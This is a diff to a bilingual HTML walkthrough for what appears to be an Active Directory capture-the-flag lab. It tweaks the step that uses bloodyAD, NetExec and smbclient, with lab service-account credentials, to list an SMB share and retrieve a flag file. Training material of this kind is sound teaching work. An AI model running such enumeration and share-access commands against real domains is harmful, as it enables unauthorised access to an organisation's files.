@@ -51,7 +51,8 @@ bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadO
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --shares
 # El recurso it_share ahora aparece como accesible
 
-smbclient //{{ ad_dc_ip }}/it_share -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' -c 'get flag-ad-09.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/it_share -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' -c 'get flag-ad-09.txt'
+cat flag-ad-09.txt</pre>
     <pre>HL{···}</pre>
 
     <h3>5 · Limpieza</h3>
@@ -100,7 +101,8 @@ bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadO
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --shares
 # The it_share share now shows up as accessible
 
-smbclient //{{ ad_dc_ip }}/it_share -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' -c 'get flag-ad-09.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/it_share -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' -c 'get flag-ad-09.txt'
+cat flag-ad-09.txt</pre>
     <pre>HL{···}</pre>
 
     <h3>5 · Cleanup</h3>
